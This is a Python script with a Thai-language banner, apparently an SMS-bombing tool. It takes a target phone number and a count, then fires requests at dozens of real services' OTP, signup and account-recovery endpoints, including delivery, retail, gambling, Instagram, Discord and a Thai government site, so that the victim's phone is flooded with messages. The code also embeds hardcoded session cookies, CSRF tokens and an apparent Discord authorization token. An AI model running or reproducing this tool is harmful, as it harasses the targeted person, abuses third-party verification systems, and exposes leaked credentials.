import requests
from requests import post,Session
import sys
import os
import time
import threading
from re import search
phone = ""
amount = ""


if len(sys.argv)==3:
	phone = sys.argv[1]
	amount = int(sys.argv[2])
	
else:
	print("""
{FF0000}อย่าลืมกดติดตามด้วยหล่ะ จะทำคลิปดีๆ แบบนี้อีก
{FFFFFF}แก้ไขส่วนต่างๆ โดย GAMEZ GAMING
{0000FF}ใช้ในการจัดการพวกเกรียนไม่อนุญาติให้ใช้ยิงคนอื่นไปทั่ว
{FFFFFF}อย่ามีความสุขบนความทุกของคนอื่นนะครับ อันนี้ผมขอถ้าจะเอาไปใช้ 
{FF0000}ห้ามนำไปแจกด้วย นะครับ ติดตามช่อง GAMEZ GAMING ด้วย
              
	""")

	phone = input("{7FFFD4}+ ใส่เบอร์ : ")
	amount = int(input("{7FFFD4}+ ใส่จำนวน : "))
	os.system("clear")
		
useragent = "Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"
def game01():
    post("https://partner-api.grab.com/grabid/v1/oauth2/otp", headers={"User-Agent": useragent}, json={"client_id":"4ddf78ade8324462988fec5bfc5874c2","transaction_ctx":"null","country_code":"TH","method":"SMS","num_digits":"6","scope":"openid profile.read foodweb.order foodweb.rewards foodweb.get_enterprise_profile","phone_number": f"66{phone[1:]}"})
    print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")
def game02():
    post(f"http://m.vcanbuy.com/gateway/msg/send_regist_sms_captcha?mobile=66-0{phone}")
    print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")    
def game03():
    post("https://nocnoc.com/authentication-service/user/OTP?b-uid=1.0.661", headers={"User-Agent": useragent}, json={"lang":"th","userType":"BUYER","locale":"th","orgIdfier":"scg","phone": f"+66{phone[1:]}","type":"signup","otpTemplate":"buyer_signup_otp_message","userParams":{"buyerName": "dec"}})
    print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")   
   
def game1():
    post("https://cognito-idp.ap-southeast-1.amazonaws.com/",headers={"cache-control": "max-age=0","user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","content-type": "application/x-amz-json-1.1","x-amz-target": "AWSCognitoIdentityProviderService.ResendConfirmationCode","x-amz-user-agent": "aws-amplify/0.1.x js","referer": "https://www.bugaboo.tv/members/resetpass/phone"},json={"ClientId":"6g47av6ddfcvi06v4l186c16d6","Username":f"+66{phone[1:]}"})
    print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")    
    
def game2():
    post("https://www.carsome.co.th/website/login/sendSMS",json={"username":phone,"optType":0})
    print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")    
def game3():
    post("https://the1web-api.the1.co.th/api/t1p/regis/requestOTP",json={
  "on": {
    "value": phone,
    "country": "66"
  },
  "type": "mobile"
},headers={"accept":"application/json, text/plain, */*","user-agent":"Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36","content-type":"application/json;charset=UTF-8"}) 



def game4():
    post("https://ecomapi.eveandboy.com/v10/user/signup/phone", data={"phone": f"{phone[1:]}","password":"123456789Az"})
    print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")    
    
def game5():
    post("https://gccircularlivingshop.com/sms/sendOtp", json={"grant_type":"otp","username": "+66"+phone,"password":"","client":"ecommerce"})
    print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")    
def game6():
    post("https://the1web-api.the1.co.th/api/t1p/regis/requestOTP", json={"on":{"value": phone,"country":"66"},"type":"mobile"})
    print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")
def game7():
    post("https://m.lucabet168.com/api/register-otp",json={"brands_id":"609caede5a67e5001164b89d","agent_register":"60a22f7d233d2900110070d7","tel": phone})
    print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")    
def game8():
    post("https://store.boots.co.th/api/v1/guest/register/otp",json={"phone_number": phone})
    print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")    
 
    
def game9():
    post("https://m.lavagame168.com/api/register-otp",headers={"x-exp-signature": "5ffc0caa4d603200124e4eb1","user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","referer": "https://m.lavagame168.com/dashboard/login"},json={"brands_id":"5ffc0caa4d603200124e4eb1","agent_register":"5ffc0d5cdcd4f30012aec3d9","tel": phone})
    print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")    
def game10():
    post("https://ep789bet.net/auth/send_otp", data={"phone":f"{phone}"})
    print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")    
def game11():
    post("https://api2.1112.com/api/v1/otp/create",json={"phonenumber":phone,
        "language": "th"},headers={"accept": "application/json, text/plain, /",
	    "user-agent": "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"})
    print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")    
    
    
    
def game12():
	post("https://discord.com/api/v9/users/@me/phone",json={
  "phone": "+66"+phone,
  "change_phone_reason": "guild_phone_required"
},headers={"authorization":"OTA4MjA2NjE4NjE1OTA2Mzg1.Ycz2Hw.TdQLC2lIwn6UQDl1xBsyJGLnjOw"})




def game13():
	post("https://www.konvy.com/ajax/system.php?type=reg&action=get_phone_code", headers={"User-Agent": useragent}, data={"phone": phone})
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")

def game13():
	post("https://api.scg-id.com/api/otp/send_otp", headers={"User-Agent": useragent, "Content-Type": "application/json;charset=UTF-8"},json={"phone_no": phone})
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")	

def game14():
	post(f"https://th.kerryexpress.com/website-api/api/OTP/v1/RequestOTP/{phone}", headers={"User-Agent": useragent})
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")	
def game15():
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")	
	post("https://www.wongnai.com/_api/guest.json?_v=6.056&locale=th&_a=phoneLogIn",data={"phoneno":phone,

"retrycount":"0"
	
	},headers={"user-agent":"Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"})
    
    
def game16():
    post("https://ocs-prod-api.makroclick.com/next-ocs-member/user/register",json={"username":phone,"password":"1111a1111A","name":phone,"provinceCode":"74","districtCode":"970","subdistrictCode":"8654","zipcode":"94140","siebelCustomerTypeId":"710","locale":"th_TH"},headers={"user-agent":"Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"})
    print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")
    
def game17():
    session = Session()
    searchItem = session.get("https://www.shopat24.com/register/").text
    ReqTOKEN = search("""<input type="hidden" name="_csrf" value="(.*)" />""", searchItem).group(1)
    session.post("https://www.shopat24.com/register/ajax/requestotp/", headers={"User-Agent": useragent, "content-type": "application/x-www-form-urlencoded; charset=UTF-8","X-CSRF-TOKEN": ReqTOKEN}, data={"phoneNumber": phone})
    print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")
     
     
def game18():
    session = Session()
    ReqTOKEN = session.get("https://srfng.ais.co.th/Lt6YyRR2Vvz%2B%2F6MNG9xQvVTU0rmMQ5snCwKRaK6rpTruhM%2BDAzuhRQ%3D%3D?redirect_uri=https%3A%2F%2Faisplay.ais.co.th%2Fportal%2Fcallback%2Ffungus%2Fany&httpGenerate=generated", headers={"User-Agent": useragent}).text
    session.post("https://srfng.ais.co.th/login/sendOneTimePW", data=f"msisdn=66{phone[1:]}&serviceId=AISPlay&accountType=all&otpChannel=sms",headers={"User-Agent": useragent,"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "authorization": f'''Bearer {search("""<input type="hidden" id='token' value="(.*)">""", ReqTOKEN).group(1)}'''})
    print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")
    
    
    
def game19():
		post("https://vaccine.trueid.net/vacc-verify/api/getotp",json={"msisdn":phone,"function":"enroll"},headers={"user-agent":"Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"})
		print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")    
    
def game20():
	post("https://topping.truemoveh.com/api/get_request_otp",data={"mobile_number": phone,
	})
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")
	
def game21():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")
    
def game22():
	requests.get("https://api.quickcash8.com/v1/login/captcha?timestamp=1636359633&sign=3a11b88fbf58615099d15639e714afcc&token=&version=2.3.2&appsFlyerId=1636346593405-2457389151564256014&platform=android&channel_str=&phone="+phone+"&img_code=", headers = {"Host": "api.quickcash8.com", "Connection": "Keep-Alive", "Accept": "gzip", "User-Agent": "okhttp/3.11.0"})
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")	
def game23():
	 requests.get("https://www.baanandbeyond.com/registration_initiate?on%5Bcountry%5D=66&on%5Bvalue%5D="+phone+"&type=mobile")
	 print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")	 
def game24():
	requests.get("https://findclone.ru/register?phone=+66"+phone)
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")	
def game25():
	requests.post("https://queenclub88.com/api/register/phone", data={"phone":phone})
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")
def game26():
	requests.post("https://www.monomax.me/api/v2/signup/telno",json ={"password":"12345678+","telno": phone})
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")	
def game27():
	requests.post("https://www.qqmoney.ltd/jackey/sms/login",json = {"appId":"5fc9ff297eb51f1196350635","companyId":"5fc9ff12197278da22aff029","mobile": phone},headers={"Content-Type": "application/json;charset=UTF-8"})
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")	
def game28():
	head = {
	    "x-requested-with": "XMLHttpRequest",
	    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
	    "accept": "*/*",
	    "referer": "https://ufa108.ufabetcash.com/register.php",
	    "cookie": "PHPSESSID=94e150551f39f0b2fcf142b58c21bb77"
	    }
	requests.post("https://ufa108.ufabetcash.com/api/",headers=head,data=f"cmd=request_form_register_detail_check&web_account_id=36&auto_bank_group_id=1&m_name=sl&m_surname=ak&m_line=snsb1j&m_bank=4&m_account_number=8572178402&m_from=41&m_phone={phone}")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")	
def game29():
	head = {
	    "x-requested-with": "XMLHttpRequest",
	    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
	    "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
	    "accept": "*/*",
	    "referer": "https://www.pruksa.com/member/register/otp_code",
	    "cookie": "verify=test;_gcl_au=1.1.1068520588.1638975731;_fbp=fb.1.1638975732655.1853691445;_accept_privacy=1;_gid=GA1.2.1560033587.1639887354;PHPSESSID=p8hr5emvd96q6lu10dm6tmfgt7;exp_last_visit=1639452885;exp_csrf_token=3e1cdd2103438cac128d4e8e653ef743f8311dae;_cbclose=1;_cbclose41932=1;_uid41932=2F6F4EEE.5;_ctout41932=1;exp_last_activity=1639887731;exp_tracker=a%3A3%3A%7Bi%3A0%3Bs%3A24%3A%22member%2Fregister%2Fotp_code%22%3Bi%3A1%3Bs%3A15%3A%22member%2Fregister%22%3Bi%3A2%3Bs%3A19%3A%22member%2Flogin%2Fdialog%22%3B%7D;AWSALB=1Evv6AvajZc8F/H8z876YldEIQEiiMHM+U533XqPouYiJbzSjpgYGJ/8oleAYB8GhBiN5a2/t5RrOgv9hXaVn0r3L0FYGUWyhj8amyU1GgObUn/WRjtvbXGGFanS;AWSALBCORS=1Evv6AvajZc8F/H8z876YldEIQEiiMHM+U533XqPouYiJbzSjpgYGJ/8oleAYB8GhBiN5a2/t5RrOgv9hXaVn0r3L0FYGUWyhj8amyU1GgObUn/WRjtvbXGGFanS;_ga_1S3Q68V0J2=GS1.1.1639887351.6.1.1639887736.0;_ga=GA1.2.1203242697.1638975732;_gat_UA-12021683-1=1;exp_current_url=https%3A%2F%2Fwww.pruksa.com%2Fmember%2Fregister%2Fotp_code"
	    }
	requests.post("https://www.pruksa.com/member/member_otp/re_create",headers=head,data=f"required=otp&mobile={phone}")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")	
def game30():
	requests.post("https://u.icq.net/api/v65/rapi/auth/sendCode", json={"reqId":"39816-1633012470","params":{"phone": phone,"language":"en-US","route":"sms","devId":"ic1rtwz1s1Hj1O0r","application":"icq"}})
	
def game31():
	requests.post("https://cognito-idp.ap-southeast-1.amazonaws.com/",headers={"user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","content-type": "application/x-amz-json-1.1","x-amz-target": "AWSCognitoIdentityProviderService.SignUp","x-amz-user-agent": "aws-amplify/0.1.x js","referer": "https://www.bugaboo.tv/members/signup/phone"},json={"ClientId":"6g47av6ddfcvi06v4l186c16d6","Username":f"+66{phone[1:]}","Password":"098098Az","UserAttributes":[{"Name":"name","Value":"Dbdh"},{"Name":"birthdate","Value":"2005-01-01"},{"Name":"gender","Value":"Male"},{"Name":"phone_number","Value":f"+66{phone[1:]}"},{"Name":"custom:phone_country_code","Value":"+66"},{"Name":"custom:is_agreement","Value":"true"},{"Name":"custom:allow_consent","Value":"true"},{"Name":"custom:allow_person_info","Value":"true"}],"ValidationData":[]})
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")	
def game32():
	requests.post("https://cognito-idp.ap-southeast-1.amazonaws.com/",headers={"cache-control": "max-age=0","user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","content-type": "application/x-amz-json-1.1","x-amz-target": "AWSCognitoIdentityProviderService.ResendConfirmationCode","x-amz-user-agent": "aws-amplify/0.1.x js","referer": "https://www.bugaboo.tv/members/resetpass/phone"},json={"ClientId":"6g47av6ddfcvi06v4l186c16d6","Username":f"+66{phone[1:]}"})
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")	
def game33():
	requests.post("https://api.scg-id.com/api/otp/send_otp", headers={"Content-Type": "application/json;charset=UTF-8"},json={"phone_no": phone})
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")	
def game34():
	requests.post("https://www.instagram.com/accounts/account_recovery_send_ajax/",data=f"email_or_username={phone}&recaptcha_challenge_field=",headers={"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36","x-csrftoken": "EKIzZefCrMss0ypkr2VjEWZ1I7uvJ9BD"}).json
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")	
def game35():
	requests.post("https://unacademy.com/api/v3/user/user_check/",json={"phone":phone,"country_code":"TH"},headers={}).json()
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")	
def game36():
	requests.post("https://ep789bet.net/auth/send_otp", data={"phone":phone})
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")	
def game37():
	requests.post("http://b226.com/x/code", data={f"phone":phone})
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")	
def game38():
	requests.post("https://www.msport1688.com/auth/send_otp", data={"phone":phone})
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")	
def game39():
	requests.get("https://m.redbus.id/api/getOtp?number="+phone[1:]+"&cc=66&whatsAppOpted=true",headers={"traceparent": "00-7d1f9d70ec75d3fb488d8eb2168f2731-6b243a298da767e5-01","user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36"}).text
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")	
def game40():
	requests.post('https://www.sso.go.th/wpr/MEM/terminal/ajax_send_otp',headers = {"User-Agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With": "XMLHttpRequest","Cookie": "sso_local_storeci_sessions=KHj9a18RowgHYWbh71T2%2FDFAcuC2%2FQaJkguD3MQ1eh%2FlwrUXvpAjJgrm6QKAja4oe7rglht%2BzO6oqblJ4EMJF4pqnY%2BGtR%2F0RzIFGN0Suh1FcoKQdx13oXJzaNv3R83CsdnjknYdWo3xvAMi7KUkIeaWkSahmh5f%2F3%2FqcOQ2OW5yakrMGA1mJ5upBZiUdEYNmxUAljcqrg7P3L%2BGAXxxC2u1bO09Oz4qf4ZV9ShO0gz5p5CbkE7VxIq1KUrEavn9Y%2BarQmsh1qIIc51uvCev1U1uyXfC%2F9U7uRl7x%2FVYZYT2pkMM8ECLaq9zC4xgck6QUJACuAxDkZyouDAn3x68dTSiOm1K04QhdrprshvnxMM8ECLaq9zC4xgck6QUJACuAxDkZyouDAn33XmRTXMKbUjlcl0LPPYUR9KWzrVL7sXcrCX%2FfUwLJIU%2F7MTtDYUx39y1CAREM%2F8dw7AEjcJAOA%3D%3D684b65b9b9dc33a3380c5b121b6c2b3ecb6f1bec; PHPSESSID=1s2rdo0664qpg4oteil3hhn3v2; TS01ac2b25=01584aa399fbfcc6474d383fdc1405e05eaa529fa33e596e5189664eb7dfefe57b927d8801ad40fba49f0adec4ce717dd5eabf08d7080e2b85f34368a92a47e71ef07861a287c40da15c0688649509d7f97eb2c293; _ga=GA1.3.1824294570.1636876684; _gid=GA1.3.1832635291.1636876684"},data=f"dCard=1358231116147&Mobile={phone}&password=098098Az&repassword=098098Az&perPrefix=Mr.&cn=Dhdhhs&sn=Vssbsh&perBirthday=5&perBirthmonth=5&perBirthyear=2545&Email=nickytom5879%40gmail.com&otp_type=OTP&otpvalue=&messageId=REGISTER")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")	
def game41():
	post("https://www.msport1688.com/auth/send_otp", data={"phone":phone})
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")
	
def game42():
	requests.post("https://queenclub88.com/api/register/phone",data={" phone":phone}
)
def game43():
	requests.post("https://u.icq.net/api/v65/rapi/auth/sendCode", json={"reqId":"39816-1633012470","params":{"phone": phone,"language":"en-US","route":"sms","devId":"ic1rtwz1s1Hj1O0r","application":"icq"}})
def game44():
	requests.post("https://cognito-idp.ap-southeast-1.amazonaws.com/",headers={"user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","content-type": "application/x-amz-json-1.1","x-amz-target": "AWSCognitoIdentityProviderService.SignUp","x-amz-user-agent": "aws-amplify/0.1.x js","referer": "https://www.bugaboo.tv/members/signup/phone"},json={"ClientId":"6g47av6ddfcvi06v4l186c16d6","Username":f"+66{phone[1:]}","Password":"098098Az","UserAttributes":[{"Name":"name","Value":"Dbdh"},{"Name":"birthdate","Value":"2005-01-01"},{"Name":"gender","Value":"Male"},{"Name":"phone_number","Value":f"+66{phone[1:]}"},{"Name":"custom:phone_country_code","Value":"+66"},{"Name":"custom:is_agreement","Value":"true"},{"Name":"custom:allow_consent","Value":"true"},{"Name":"custom:allow_person_info","Value":"true"}],"ValidationData":[]})
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")	
def game45():
	requests.post("https://cognito-idp.ap-southeast-1.amazonaws.com/",headers={"cache-control": "max-age=0","user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","content-type": "application/x-amz-json-1.1","x-amz-target": "AWSCognitoIdentityProviderService.ResendConfirmationCode","x-amz-user-agent": "aws-amplify/0.1.x js","referer": "https://www.bugaboo.tv/members/resetpass/phone"},json={"ClientId":"6g47av6ddfcvi06v4l186c16d6","Username":f"+66{phone[1:]}"})
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")	
def game46():
	requests.post("https://api.scg-id.com/api/otp/send_otp", headers={"Content-Type": "application/json;charset=UTF-8"},json={"phone_no": phone})
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")	
def game47():
	requests.post("https://www.instagram.com/accounts/account_recovery_send_ajax/",data=f"email_or_username={phone}&recaptcha_challenge_field=",headers={"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36","x-csrftoken": "EKIzZefCrMss0ypkr2VjEWZ1I7uvJ9BD"}).json
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")	
def game48():
	requests.post("https://unacademy.com/api/v3/user/user_check/",json={"phone":phone,"country_code":"TH"},headers={}).json()
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")	
def game49():
	requests.post("https://ep789bet.net/auth/send_otp", data={"phone":phone})
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")	
def game50():
	requests.post("http://b226.com/x/code", data={f"phone":phone})
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")	
def game51():
	requests.post("https://www.msport1688.com/auth/send_otp", data={"phone":phone})
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")	
def game52():
	requests.get("https://m.redbus.id/api/getOtp?number="+phone[1:]+"&cc=66&whatsAppOpted=true",headers={"traceparent": "00-7d1f9d70ec75d3fb488d8eb2168f2731-6b243a298da767e5-01","user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36"}).text
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")	
def game53():
	requests.post('https://www.sso.go.th/wpr/MEM/terminal/ajax_send_otp',headers = {"User-Agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With": "XMLHttpRequest","Cookie": "sso_local_storeci_sessions=KHj9a18RowgHYWbh71T2%2FDFAcuC2%2FQaJkguD3MQ1eh%2FlwrUXvpAjJgrm6QKAja4oe7rglht%2BzO6oqblJ4EMJF4pqnY%2BGtR%2F0RzIFGN0Suh1FcoKQdx13oXJzaNv3R83CsdnjknYdWo3xvAMi7KUkIeaWkSahmh5f%2F3%2FqcOQ2OW5yakrMGA1mJ5upBZiUdEYNmxUAljcqrg7P3L%2BGAXxxC2u1bO09Oz4qf4ZV9ShO0gz5p5CbkE7VxIq1KUrEavn9Y%2BarQmsh1qIIc51uvCev1U1uyXfC%2F9U7uRl7x%2FVYZYT2pkMM8ECLaq9zC4xgck6QUJACuAxDkZyouDAn3x68dTSiOm1K04QhdrprshvnxMM8ECLaq9zC4xgck6QUJACuAxDkZyouDAn33XmRTXMKbUjlcl0LPPYUR9KWzrVL7sXcrCX%2FfUwLJIU%2F7MTtDYUx39y1CAREM%2F8dw7AEjcJAOA%3D%3D684b65b9b9dc33a3380c5b121b6c2b3ecb6f1bec; PHPSESSID=1s2rdo0664qpg4oteil3hhn3v2; TS01ac2b25=01584aa399fbfcc6474d383fdc1405e05eaa529fa33e596e5189664eb7dfefe57b927d8801ad40fba49f0adec4ce717dd5eabf08d7080e2b85f34368a92a47e71ef07861a287c40da15c0688649509d7f97eb2c293; _ga=GA1.3.1824294570.1636876684; _gid=GA1.3.1832635291.1636876684"},data=f"dCard=1358231116147&Mobile={phone}&password=098098Az&repassword=098098Az&perPrefix=Mr.&cn=Dhdhhs&sn=Vssbsh&perBirthday=5&perBirthmonth=5&perBirthyear=2545&Email=nickytom5879%40gmail.com&otp_type=OTP&otpvalue=&messageId=REGISTER")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")	
def game54():
	post("https://www.msport1688.com/auth/send_otp", data={"phone":phone})
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")
	
def game55():
	requests.post("https://queenclub88.com/api/register/phone",data={" phone":phone}
)

def game56():
	requests.post("https://u.icq.net/api/v65/rapi/auth/sendCode", json={"reqId":"39816-1633012470","params":{"phone": phone,"language":"en-US","route":"sms","devId":"ic1rtwz1s1Hj1O0r","application":"icq"}})
	
def game57():
	requests.post("https://cognito-idp.ap-southeast-1.amazonaws.com/",headers={"user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","content-type": "application/x-amz-json-1.1","x-amz-target": "AWSCognitoIdentityProviderService.SignUp","x-amz-user-agent": "aws-amplify/0.1.x js","referer": "https://www.bugaboo.tv/members/signup/phone"},json={"ClientId":"6g47av6ddfcvi06v4l186c16d6","Username":f"+66{phone[1:]}","Password":"098098Az","UserAttributes":[{"Name":"name","Value":"Dbdh"},{"Name":"birthdate","Value":"2005-01-01"},{"Name":"gender","Value":"Male"},{"Name":"phone_number","Value":f"+66{phone[1:]}"},{"Name":"custom:phone_country_code","Value":"+66"},{"Name":"custom:is_agreement","Value":"true"},{"Name":"custom:allow_consent","Value":"true"},{"Name":"custom:allow_person_info","Value":"true"}],"ValidationData":[]})
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")	
def game58():
	requests.post("https://cognito-idp.ap-southeast-1.amazonaws.com/",headers={"cache-control": "max-age=0","user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","content-type": "application/x-amz-json-1.1","x-amz-target": "AWSCognitoIdentityProviderService.ResendConfirmationCode","x-amz-user-agent": "aws-amplify/0.1.x js","referer": "https://www.bugaboo.tv/members/resetpass/phone"},json={"ClientId":"6g47av6ddfcvi06v4l186c16d6","Username":f"+66{phone[1:]}"})
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")	
def game59():
	requests.post("https://api.scg-id.com/api/otp/send_otp", headers={"Content-Type": "application/json;charset=UTF-8"},json={"phone_no": phone})
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓ เป็นจำนวน {amount}")	
def game60():
